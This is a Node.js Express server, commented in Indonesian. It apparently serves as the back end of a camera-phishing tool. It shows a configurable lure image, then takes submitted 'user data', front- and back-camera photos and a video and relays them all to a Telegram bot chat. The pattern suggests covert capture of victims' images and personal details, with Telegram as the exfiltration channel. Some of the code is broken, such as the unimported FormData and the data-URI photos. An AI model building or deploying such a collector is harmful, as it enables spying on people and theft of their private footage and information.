const express = require("express");
const multer = require("multer");
const axios = require("axios");
const fs = require("fs");

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
const CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";

let imageUrl = "https://example.com/default-image.jpg"; // Gambar default

app.use(express.static("public"));
app.use(express.json());

// API untuk mengubah gambar tampilan
app.post("/set-image", (req, res) => {
    if (req.body.imageUrl) {
        imageUrl = req.body.imageUrl;
        res.json({ success: true, message: "Gambar berhasil diperbarui!" });
    } else {
        res.status(400).json({ success: false, message: "URL gambar tidak valid!" });
    }
});

// API untuk mendapatkan gambar tampilan
app.get("/image", (req, res) => {
    res.json({ imageUrl });
});

// API untuk mengirim data ke Telegram
app.post("/send", upload.fields([{ name: "frontImage" }, { name: "backImage" }, { name: "video" }]), async (req, res) => {
    try {
        const { info } = req.body;
        const frontImage = req.files["frontImage"][0].buffer.toString("base64");
        const backImage = req.files["backImage"][0].buffer.toString("base64");
        const video = req.files["video"][0];

        // Kirim Info Text
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `📌 *Data Pengguna*\n\n${info}`,
            parse_mode: "Markdown"
        });

        // Kirim Foto Depan
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            chat_id: CHAT_ID,
            photo: `data:image/jpeg;base64,${frontImage}`,
            caption: "📸 Kamera Depan"
        });

        // Kirim Foto Belakang
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            chat_id: CHAT_ID,
            photo: `data:image/jpeg;base64,${backImage}`,
            caption: "📸 Kamera Belakang"
        });

        // Simpan Video ke File Sementara
        const videoPath = `./video.mp4`;
        fs.writeFileSync(videoPath, video.buffer);

        // Kirim Video
        const videoData = new FormData();
        videoData.append("chat_id", CHAT_ID);
        videoData.append("video", fs.createReadStream(videoPath));

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, videoData, {
            headers: videoData.getHeaders()
        });

        fs.unlinkSync(videoPath); // Hapus file setelah dikirim
        res.send("Data terkirim ke Telegram!");
    } catch (error) {
        console.error("Gagal mengirim ke Telegram:", error);
        res.status(500).send("Gagal mengirim data.");
    }
});

app.listen(3000, () => console.log("Server berjalan di port 3000"));
